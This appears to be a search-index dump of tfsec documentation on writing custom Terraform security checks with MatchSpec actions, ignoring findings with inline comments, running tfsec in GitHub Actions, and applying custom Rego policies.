<code>endsWith</code> check action passes if the checked attribute string ends with the specified value. For example, to check that <code>acl</code> ends with <code>read</code> you could use the following <code>MatchSpec</code>;</p> <pre><code>\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"endsWith\",\n  \"value\": \"-read\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: endsWith\n  value: -read\n</code></pre>","title":"endsWith"},{"location":"guides/configuration/custom-checks/#contains","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>contains</code> check action will change depending on the attribute or block it is applied to. If the check is against a string attribute, it will look for the <code>MatchSpec</code> value in the attribute. If the check is against a list, it will pass if the value item can be found in the list.</p> <p>If the attribute is an <code>object</code> or <code>map</code> it will pass if a key can be found that matches the <code>MatchSpec</code> value.</p> <p>For example, if you want to ensure that the <code>CostCentre</code> exists, you might use the following <code>MatchSpec</code>;</p> <pre><code>\"matchSpec\" : {\n  \"name\": \"tags\",\n  \"action\": \"contains\",\n  \"value\": \"CostCentre\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: tags\n  action: contains\n  value: CostCentre\n</code></pre>","title":"contains"},{"location":"guides/configuration/custom-checks/#notcontains","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>notContains</code> check action will change depending on the attribute or block it is applied to. If the check is against a string attribute, it will look for the <code>MatchSpec</code> value in the attribute. If the check is against a list, it will pass if the value item can be found in the list.</p> <p>If the attribute is an <code>object</code> or <code>map</code> it will pass if a key can be found that matches the <code>MatchSpec</code> value.</p> <p>For example, you want to make sure that an <code>action</code> does not contain <code>kms:*</code> you might use the following <code>MatchSpec</code>:</p> <pre><code>\"matchSpec\" : {\n  \"name\": \"action\",\n  \"action\": \"notContains\",\n  \"value\": \"kms:*\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: tags\n  action: notContains\n  value: kms:*\n</code></pre>","title":"notContains"},{"location":"guides/configuration/custom-checks/#onlycontains","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>onlyContains</code> check action ensures that a slice value only contains acceptable values.</p> <p>For example. if you want to ensure that the <code>tags</code> only contain <code>CostCentre</code> and <code>Environment</code> you might use the following <code>MatchSpec</code>:</p> <pre><code>\"matchSpec\" : {\n  \"name\": \"tags\",\n  \"action\": \"onlyContains\",\n  \"value\": [\n    \"Environment:prod\",\n    \"CostCentre:engineering\"\n  ]\n]\n}\n</code></pre> <pre><code>matchSpec:\n  name: tags\n  action: onlyContains\n  value:\n    - Environment:prod\n    - CostCentre:engineering\n</code></pre>","title":"onlyContains"},{"location":"guides/configuration/custom-checks/#equals","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>equals</code> check action passes if the checked attribute equals specified value.  The core primitive types are supported, if the subject attribute is a Boolean, the <code>MatchSpec</code> value will attempt to be cast to a Boolean for comparison. For example, to check that <code>acl</code> begins with <code>private</code> you could use the following <code>MatchSpec</code>;</p> <pre><code>\"matchSpec\" : {\n  \"name\": \"acl\",\n  \"action\": \"equals\",\n  \"value\": \"private\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: equals\n  value: private\n</code></pre>","title":"equals"},{"location":"guides/configuration/custom-checks/#lessthan","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>lessThan</code> check action passes if the checked attribute is numerical and the value is less than the specified value. For example, if you want to ensure that the <code>cpu_core_count</code> is less than 8, you might use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"lessThan\",\n  \"value\": 8\n}\n</code></pre> <pre><code>matchSpec:\n  name: cpu_core_count\n  action: lessThan\n  value: 8\n</code></pre>","title":"lessThan"},{"location":"guides/configuration/custom-checks/#lessthanorequalto","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>lessThanOrEqualTo</code> check action passes if the checked attribute is numerical and the value is less than or equal to the specified value. For example, if you want to ensure that the <code>cpu_core_count</code> is less than or equal to 4, you might use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"lessThanOrEqualTo\",\n  \"value\": 4\n}\n</code></pre> <pre><code>matchSpec:\n  name: cpu_core_count\n  action: lessThanOrEqualTo\n  value: 4\n</code></pre>","title":"lessThanOrEqualTo"},{"location":"guides/configuration/custom-checks/#greaterthan","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>greaterThan</code> check action passes if the checked attribute is numerical and the value is greater than the specified value. For example, if you want to ensure that the <code>cpu_core_count</code> is greater than 2, you might use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"greaterThan\",\n  \"value\": 2\n}\n</code></pre> <pre><code>matchSpec:\n  name: cpu_core_count\n  action: greaterThan\n  value: 2\n</code></pre>","title":"greaterThan"},{"location":"guides/configuration/custom-checks/#greaterthanorequalto","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>greaterThanOrEqualTo</code> check action passes if the checked attribute is numerical and the value is greater than or equal to the specified value. For example, if you want to ensure that the <code>cpu_core_count</code> is greater than or equal to 4, you might use the following <code>MatchSpec</code></p> <pre><code>\"matchSpec\" : {\n  \"name\": \"cpu_core_count\",\n  \"action\": \"greaterThanOrEqualTo\",\n  \"value\": 4\n}\n</code></pre> <pre><code>matchSpec:\n  name: cpu_core_count\n  action: greaterThanOrEqualTo\n  value: 4\n</code></pre>","title":"greaterThanOrEqualTo"},{"location":"guides/configuration/custom-checks/#regexmatches","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>regexMatches</code> check action passes when the regex is matched to the pattern passed in the value. This is check would generally be used as a top level check to filter whether or not to apply a check.</p> <p>For example, this check will ensure that the source attribute of a module matches the supplied regex before continuing with the subMatches. This can be used to ensure that checks are targeted to specific modules.</p> <p>When tackling this specific use case of filtering module blocks by source, the <code>requiredLabels</code> should be set to <code>\"*\"</code></p> <pre><code>    \"matchSpec\": {\n        \"name\": \"source\",\n        \"action\": \"regexMatches\",\n        \"value\": \"^modules\\\\/.*public_.+bucket$\",\n        \"subMatch\": {\n          \"name\": \"acl\",\n          \"action\": \"equals\",\n          \"value\": \"public-read\"\n        }\n      }\n</code></pre> <pre><code>matchSpec:\n  name: source\n  action: regexMatches\n  value: \"^modules\\\\/.*public_.+bucket$\"\n  subMatch:\n    name: acl\n    action: equals\n    value: public-read\n</code></pre>","title":"regexMatches"},{"location":"guides/configuration/custom-checks/#isany","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>isAny</code> check action passes when the attribute value can be found in the slice passed as the check value. This check action supports strings and numbers</p> <pre><code>\"matchSpec\": {\n  \"name\": \"acl\",\n  \"action\": \"isAny\",\n  \"value\": [\"private\", \"log-delivery-write\"]\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: isAny\n  value:\n  - private\n  - log-delivery-write\n</code></pre>","title":"isAny"},{"location":"guides/configuration/custom-checks/#isnone","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>isNone</code> check action passes when the attribute value cannot be found in the slice passed as the check value. This check action supports strings and numbers</p> <pre><code>\"matchSpec\": {\n  \"name\": \"acl\",\n  \"action\": \"isNone\",\n  \"value\": [\"authenticated-read\", \"public-read\"]\n}\n</code></pre> <pre><code>matchSpec:\n  name: acl\n  action: isNone\n  value:\n  - authenticated-read\n  - public-read\n</code></pre>","title":"isNone"},{"location":"guides/configuration/custom-checks/#requirespresence","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>requiresPresence</code> checks that the resource in <code>name</code> is also present in the Terraform code.</p> <p>If you wanted to ensure that <code>aws_vpc_flowlogs</code> is present if there is a <code>aws_vpc</code>, you might use the following <code>matchSpec</code>:</p> <pre><code>\"matchSpec\" : {\n  \"action\": \"requiresPresence\",\n  \"name\": \"aws_vpc_flowlogs\"\n}\n</code></pre> <pre><code>matchSpec:\n  name: aws_vpc_flowlogs\n  action: requiresPresence\n</code></pre>","title":"requiresPresence"},{"location":"guides/configuration/custom-checks/#and","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>and</code> check action passes when all the blocks provided within <code>predicateMatchSpec</code> evaluate to <code>true</code>. This action can be combined with <code>subMatch</code> to perform composite checks against the contents of nested blocks.</p> <p>Note that <code>or</code> and <code>and</code> actions can be nested as many times as needed.</p> <p>If you wanted to ensure that <code>device_name</code> and <code>encrypted</code> are both present in a nested <code>ebs_block_device</code> block, you might use the following <code>matchSpec</code>:</p> <pre><code>\"matchSpec\": {\n  \"action\": \"isPresent\",\n  \"name\": \"ebs_block_device\",\n  \"subMatch\": {\n    \"action\": \"and\",\n    \"predicateMatchSpec\": [\n      {\n        \"action\": \"isPresent\",\n        \"name\": \"device_name\"      \n      },\n      {\n        \"action\": \"isPresent\",\n        \"name\": \"encrypted\"\n      }\n    ]\n  }\n}\n</code></pre> <pre><code>matchSpec:\n  action: isPresent\n  name: ebs_block_device\n  subMatch : \n    action : and\n    predicateMatchSpec :\n      - action : isPresent\n        name : device_name\n      - action : isPresent\n        name : encrypted \n</code></pre>","title":"and"},{"location":"guides/configuration/custom-checks/#or","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>or</code> check action passes when at least one of the blocks provided within <code>predicateMatchSpec</code> evaluates to <code>true</code>. This action can be combined with <code>subMatch</code> to perform composite checks against the contents of nested blocks.</p> <p>Note that <code>or</code> and <code>and</code> actions can be nested as many times as needed.</p> <p>If you want to ensure that <code>virtualization_type</code> is assigned to either <code>hvm</code> or <code>paravirtual</code>, while enforcing that their implicitly linked required attributes are also present, you might use the following <code>matchSpec</code>:</p> <pre><code>\"matchSpec\": {\n  \"action\": \"or\",\n  \"predicateMatchSpec\": [\n    {\n      \"action\": \"and\",\n      \"predicateMatchSpec\": [\n        {\n          \"name\": \"virtualization_type\",\n          \"action\": \"equals\",\n          \"value\": \"hvm\"\n        }\n      ]\n    },\n    {\n      \"action\": \"and\",\n      \"predicateMatchSpec\": [\n        {\n          \"name\": \"virtualization_type\",\n          \"action\": \"equals\",\n          \"value\": \"paravirtual\"\n        },\n        {\n          \"name\": \"image_location\",\n          \"action\": \"isPresent\"\n        },\n        {\n          \"name\": \"kernel_id\",\n          \"action\": \"isPresent\"\n        }\n      ]\n    }\n  ]\n}\n</code></pre> <pre><code>matchSpec:\n  action: or\n  predicateMatchSpec:\n    - action: and\n      predicateMatchSpec:\n        - name: virtualization_type\n          action: equals\n          value: hvm\n        - name: sriov_net_support\n          action: isPresent\n    - action: and\n      predicateMatchSpec:\n        - name: virtualization_type\n          action: equals\n          value: paravirtual\n        - name: image_location\n          action: isPresent\n        - name: kernel_id\n          action: isPresent\n</code></pre>","title":"or"},{"location":"guides/configuration/custom-checks/#not","tags":["installation","github action","code scanning","security analysis"],"text":"<p>The <code>not</code> check action passes when the <code>predicateMatchSpec</code> evaluates to <code>false</code>.</p> <p>As an example, if you want to represent that a <code>resource</code> should not be included <code>inModule</code> you might use the following <code>matchSpec</code>:</p> <pre><code>\"matchSpec\": {\n  \"action\": \"not\",\n  \"predicateMatchSpec\": [\n    {\n        \"action\": \"inModule\" \n    }\n  ]\n}\n</code></pre> <pre><code>matchSpec:\n  action: not\n  predicateMatchSpec:\n    - action: inModule\n</code></pre>","title":"not"},{"location":"guides/configuration/custom-checks/#how-do-i-know-my-json-is-valid","tags":["installation","github action","code scanning","security analysis"],"text":"<p>We have provided the <code>tfsec-checkgen</code> binary which will validate your check file or help perform tests to ensure that it is valid for use with <code>tfsec</code>.</p>","title":"How do I know my JSON is valid?"},{"location":"guides/configuration/custom-checks/#tfsec-checkgen-validate","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Validates the syntax of a custom check.</p> <p>```shell script go run ./cmd/tfsec-checkgen validate example/custom/.tfsec/custom_checks.json <pre><code>### `tfsec-checkgen test-check`\n\nTests custom check against provided test cases. You can pass in multiple `--fail`/`-f`/`--pass`/`-p` flags to perform multiple tests at once on the same custom check.\n\n```shell script\ngo run ./cmd/tfsec-checkgen test-check ./example/cmd_checkgen_test-check/.tfsec/example_tfchecks.json \\\n--fail ./example/cmd_checkgen_test-check/fail.tf \\\n--pass ./example/cmd_checkgen_test-check/pass.tf\n</code></pre></p> <p>Alternatively, you can install the tfsec-checkgen from the releases page</p>","title":"<code>tfsec-checkgen validate</code>"},{"location":"guides/configuration/custom-checks/#are-there-limitations","tags":["installation","github action","code scanning","security analysis"],"text":"<p>At the moment, check <code>MatchSpec</code> is limited in the number of check types it can perform, these are as shown in the previous table.</p> <p>Custom defined checks also don't come with the comprehensive tests that the built in ones have. This will be addressed in future releases.</p>","title":"Are there limitations?"},{"location":"guides/configuration/ignores/","text":"","title":"Ignoring Checks"},{"location":"guides/configuration/ignores/#ignoring-issues","text":"<p>You may wish to ignore some issues. If you'd like to do so, you can simply add a comment containing <code>tfsec:ignore:&lt;rule&gt;</code> to the offending line in your templates. If the problem refers to a block of code, such as a multiline string, you can add the comment on the line above the block, by itself.</p> <p>For example, to ignore an open security group rule:</p> <pre><code>resource \"aws_security_group_rule\" \"my-rule\" {\n    type = \"ingress\"\n    cidr_blocks = [\"0.0.0.0/0\"] #tfsec:ignore:aws-vpc-no-public-ingress-sgr\n}\n</code></pre> <p>...or...</p> <pre><code>resource \"aws_security_group_rule\" \"my-rule\" {\n    type = \"ingress\"\n    #tfsec:ignore:aws-vpc-no-public-ingress-sgr\n    cidr_blocks = [\"0.0.0.0/0\"]\n}\n</code></pre> <p>If you're not sure which line to add the comment on, just check the tfsec output for the line number of the discovered problem.</p> <p>You can ignore multiple rules by concatenating the rules on a single line:</p> <pre><code>#tfsec:ignore:aws-s3-enable-bucket-encryption tfsec:ignore:aws-s3-enable-bucket-logging\nresource \"aws_s3_bucket\" \"my-bucket\" {\n  bucket = \"foobar\"\n  acl    = \"private\"\n}\n</code></pre>","title":"Ignoring Issues"},{"location":"guides/configuration/ignores/#ignoring-module-issues","text":"<p>Issues within third-party modules cannot be ignored with the above method, as you might not have access to modify the module source code. In this situation you can add ignore rules above the module block where the module is imported, for example:</p> <pre><code>#tfsec:ignore:AWS052:exp:2022-01-01\nmodule \"db\" {\n  source = \"terraform-aws-modules/rds/aws\"\n  ...\n</code></pre>","title":"Ignoring Module Issues"},{"location":"guides/configuration/ignores/#expiration-date","text":"<p>You can set expiration date for <code>ignore</code> with <code>yyyy-mm-dd</code> format. This is a useful feature when you want to ensure ignored issue won't be forgotten and should be revisited in the future. <pre><code>#tfsec:ignore:aws-s3-enable-bucket-encryption:exp:2022-01-02\n</code></pre> Ignore like this will be active only till <code>2022-01-02</code>, after this date it will be deactivated.</p>","title":"Expiration Date"},{"location":"guides/configuration/ignores/#workspace-ignores","text":"<p>Ignoring checks can be scoped to a workspace level. If you add the <code>ws:</code> declaration to your ignore it will only be honoured for that workspace.</p> <pre><code># tfsec:ignore:AWS006:exp:2221-01-02 #tfsec:ignore:AWS018:ws:development\nresource \"aws_security_group_rule\" \"my-rule\" {\n    type        = \"ingress\"\n\n    cidr_blocks = [\"0.0.0.0/0\"]\n}\n</code></pre> <p>In the example above, when tfsec is run with the <code>--workspace</code> flag set to development, this ignore will be honoured, but otherwise will be disregarded.</p> <pre><code>tfsec --workspaces development .\n</code></pre>","title":"Workspace Ignores"},{"location":"guides/configuration/ignores/#ignoring-specific-values","text":"<p>We have recently added support for ignoring based on the value that has been provided. This is particularly relevant when using <code>for_each</code> and you want to allow certain values. </p> <pre><code>locals {\n  rules = {\n    http = 80\n    https = 443 \n  }\n}\n\n#tfsec:ignore:aws-vpc-no-public-ingress-sgr[from_port=443]\nresource \"aws_security_group_rule\" \"this\" {\n      for_each = local.rules\n      type = \"ingress\"\n      description     = \"test\"\n      from_port       = each.value \n      to_port         = each.value\n      protocol        = \"tcp\"\n      cidr_blocks     = [\"0.0.0.0/0\"]\n\n}\n</code></pre> <p>In the example above, the <code>aws-vpc-no-public-ingress-sgr</code> check will fail for <code>80</code> but when it creates the rule for <code>443</code> the check will pass.</p> <p>This feature is experimental - while it works successfully, please raise issues through GitHub Issues</p>","title":"Ignoring specific values"},{"location":"guides/github-actions/github-action/","tags":["installation","github action","code scanning","security analysis"],"text":"","title":"Github Action - Code Scanning"},{"location":"guides/github-actions/github-action/#what-is-it","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Github security alerts sit on the <code>Security</code> tab in your github project and detail any security issues that have been found.</p> <p><code>tfsec</code> can enrich this information, annotating the exact areas in the code base for a given branch with the details of the failure and the severity.</p> <p>We have provided an action which can be used in your github repo with very little effort.</p>","title":"What is it?"},{"location":"guides/github-actions/github-action/#adding-the-action","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Github Actions make it easy to add functionality; to add an action, go to the <code>Action</code> tab to create a new workflow and choose to Set up a workflow yourself.</p> <p></p> <p>Paste in the workflow content below (be sure to check you're using the latest version of the tfsec-sarif-action by checking here)</p> <pre><code>name: tfsec\non:\n  push:\n    branches:\n      - main\n  pull_request:\njobs:\n  tfsec:\n    name: tfsec sarif report\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Clone repo\n        uses: actions/checkout@main\n\n      - name: tfsec\n        uses: tfsec/tfsec-sarif-action@master\n        with:\n          sarif_file: tfsec.sarif         \n\n      - name: Upload SARIF file\n        uses: github/codeql-action/upload-sarif@v1\n        with:\n          # Path to SARIF file relative to the root of the repository\n          sarif_file: tfsec.sarif    \n</code></pre>","title":"Adding the action"},{"location":"guides/github-actions/github-action/#what-is-this-doing","tags":["installation","github action","code scanning","security analysis"],"text":"<p>Basically, this action is starting a new <code>ubuntu</code> github action container and checking out the code for either the pull request or the push to master/main.</p> <p>Once the code has been checked out, <code>tfsec</code> with process everything in the local path and generate a sarif report.</p> <p>Finally, the sarif report will be uploaded and the <code>Security</code> tab updated with the identified checks. </p> <p>It will look something like;</p> <p></p>","title":"What is this doing?"},{"location":"guides/github-actions/github-action/#anything-else-i-should-know","tags":["installation","github action","code scanning","security analysis"],"text":"<p>If you have code that is deeper in the github repo, you can use <code>working_directory</code> for the action;</p> <pre><code>- name: tfsec\n  uses: tfsec/tfsec-sarif-action@v0.0.3\n  with:\n    working_directory: terraform/relevant\n    sarif_file: tfsec.sarif         \n    github_token: ${{ secrets.GITHUB_TOKEN }}\n</code></pre> <p>This will target the checks to all folders under <code>terraform/relevant</code></p>","title":"Anything else I should know?"},{"location":"guides/github-actions/pr-commenter/","tags":["installation","github action","PR commenting"],"text":"","title":"Github Action - PR Commenter"},{"location":"guides/github-actions/pr-commenter/#what-is-it","tags":["installation","github action","PR commenting"],"text":"<p>The PR Commenter action will process a Pull request and add comments to any areas of the change which fail the <code>tfsec</code> checks.</p>","title":"What is it?"},{"location":"guides/github-actions/pr-commenter/#adding-the-action","tags":["installation","github action","PR commenting"],"text":"<p>To add the action, add tfsec_pr_commenter.yml into the .github/workflows directory in the root of your Github project.</p> <p></p> <p>The contents of tfsec_pr_commenter.yml should be;</p> <pre><code>name: tfsec-pr-commenter\non:\n  pull_request:\njobs:\n  tfsec:\n    name: tfsec PR commenter\n    runs-on: ubuntu-latest\n\n    steps:\n      - name: Clone repo\n        uses: actions/checkout@master\n\n      - name: tfsec\n        uses: tfsec/tfsec-pr-commenter-action@main\n        with:\n          github_token: ${{ secrets.GITHUB_TOKEN }}\n</code></pre> <p>On each pull request and subsequent commit, tfsec will run and add comments to the PR where tfsec has failed.</p> <p>The comment will only be added once per transgression.</p>","title":"Adding the action"},{"location":"guides/github-actions/pr-commenter/#example-pr-comment","tags":["installation","github action","PR commenting"],"text":"<p>The screenshot below demonstrates the comments that can be expected when using the action</p> <p></p>","title":"Example PR Comment"},{"location":"guides/rego/rego/","tags":["rego","custom","code scanning","security analysis"],"text":"<p>tfsec has the capability to apply user-defined Rego policies.</p> <p>This is a useful feature if your organisation needs to implement custom security policies on top of avoid other misconfigurations and enforcing best practice guidelines.</p>","title":"Rego Policies"},{"location":"guides/rego/rego/#example-policy","tags":["rego","custom","code scanning","security analysis"],"text":"<pre><code>package custom.aws.s3.no_insecure_buckets\n\nimport data.lib.result\n\ndeny[res] {\n    bucket := input.aws.s3.buckets[_]\n    bucket.name.value == \"insecure-bucket\"\n    msg := \"Bucket name should not be 'insecure-bucket'\"\n    res := result.new(msg, bucket.name)\n}\n</code></pre> <p>Let's break this down.</p> <p>The package (line #1) must always start with the <code>custom</code> namespace in order for tfsec to recognise it. The rest of the package name can be whatever you like, but it's generally a good idea to break things down by cloud provider, service, environment etc.</p> <p>The name of the <code>deny</code> rule is important. Rule names must either be <code>deny</code>, or begin with <code>deny_</code> in order to highlight an issue when tfsec runs.</p> <p>The <code>input</code> variable contains cloud resources organised by provider (e.g aws), and then service (e.g. s3). You can see what this looks like by running tfsec on your project with the <code>--print-rego-input</code> flag. Combining this with the jq tool is very helpful:</p> <pre><code>tfsec --print-rego-input | jq '.aws.s3.buckets[0].name'\n{\n  \"endline\": 3,\n  \"explicit\": true,\n  \"filepath\": \"/home/liamg/rego-playground/terraform/bucket.tf\",\n  \"managed\": true,\n  \"startline\": 3,\n  \"value\": \"secure-bucket\"\n}\n</code></pre> <p>For more information about the input structure, you can review the entire schema in code form by studying the <code>state.State</code> Go struct defined in the defsec source code. All property names are converted to lower-case for consistency, to make writing policies easier.</p> <p>You may have noticed that the policy checks <code>bucket.name.value</code>, instead of just <code>bucket.name</code>. This is because the <code>bucket.name</code> property contains more than just the value of the property, it also contains various metadata about where this property value was defined, including the filename and line number of the source Terraform file. You can see an example of this metadata in the jq output above.</p> <p>The <code>res</code> object which is returned should be created with the <code>result.new()</code> function. This is the magic that ensures line numbers and file numbers can be reported when a policy fails. The function takes two parameters:</p> <ul> <li>msg This parameter is a string which explains the specific issue which has been encountered, e.g. <code>MFA is not enabled for this user</code></li> <li>source This parameter is the property or object where the problem was encountered.</li> </ul> <p>If you are writing a policy which has no meaningful source parameter/object, you can return a simple string from the rule instead.</p>","title":"Example Policy"},{"location":"guides/rego/rego/#applying-rego-policies","tags":["rego","custom","code scanning","security analysis"],"text":"<p>You can ask tfsec to apply your custom Rego policies by using the <code>--rego-policy-dir</code> flag to specify the directory containing your policies. </p> <p>Policies will be loaded recursively starting at this directory, and so can be organised using nested subdirectories if desired.</p> <p>If this flag is not specified, no local directories will be scanned for rego policies.</p>","title":"Applying Rego Policies"}]}